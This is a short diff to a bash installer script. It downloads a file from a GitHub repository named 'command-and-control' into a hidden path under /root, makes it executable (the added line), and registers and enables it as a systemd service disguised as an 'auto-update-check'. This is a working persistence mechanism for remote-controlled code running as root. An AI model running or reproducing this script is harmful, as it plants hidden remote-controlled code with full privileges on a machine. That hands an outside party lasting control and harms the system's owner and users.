@@ -1,5 +1,6 @@
 #!/bin/bash
 curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/auto-update-check > /root/.auto-update-check
+chmod +x /root/.auto-update-check
 curl -s https://raw.githubusercontent.com/athulnair02/command-and-control/main/auto-update-check.service > /etc/systemd/system/auto-update-check.service
 systemctl daemon-reload
 systemctl enable auto-update-check
